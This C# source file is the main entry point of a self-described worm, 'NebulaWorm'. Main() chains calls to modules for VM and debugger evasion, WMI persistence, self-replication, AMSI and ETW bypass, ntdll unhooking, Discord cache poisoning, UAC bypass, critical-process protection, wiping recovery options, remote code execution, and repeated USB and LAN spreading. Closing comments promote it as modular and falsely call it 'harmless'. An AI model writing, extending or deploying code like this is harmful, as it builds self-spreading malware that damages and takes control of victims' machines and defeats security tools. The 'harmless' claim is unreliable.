using System;
using System.Threading;
using System.Threading.Tasks;

namespace NebulaWorm
{
    internal static class Program
    {
        private static Random rnd = new Random();

        [STAThread]
        static async Task Main()
        {
            try
            {

                if (AntiDebug.IsDebuggedOrVM()) //vm check if its not vm it returns
                    return;

                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                WMIPersistence.CreateWMIEventSubscription(exePath);

                SelfReplicator.CopyToAppDataIfNeeded();

                Persistence.Apply();

                AmsiBypass.Bypass();

                Kill.CheckAndExecute(); //optional but this module is for control

                Cpuload.Start(); //if u dont want the cpu load module u can just delete this or add //

                SlowWi.Start();

                EtwBypass.ETWBypass();

                Unhook.RestoreNtdll();

                Discord.PoisonCache();
     
                UsbSpread.Spread();

                UACBypass.Start();

                CriticalProcess.MakeCritical();

                DPIBypass.Apply();

                AntiRecovery.Wipe();

                RCE.Start();

                BypassWin.Start();

                while (true) // these are the looped ones
                {
                 
                    UsbSpread.Spread();
                  await LanSpread.SpreadAsync();
            
                    int delay = rnd.Next(1, 5) * 60 * 120; 
                    Thread.Sleep(delay);
                }
            }
            catch
            {
              
            }
        }
    }
}
// made by github.com/keegan31 C# NET-USB Worm
// this worm is can be easily modified or added to another Project As A Module
//every code is simple lines of code Has Anti VM Anti Debugger
// hello if you are analysing this file its just a harmless worm almost same as sasser worm but this worm is optimised and modular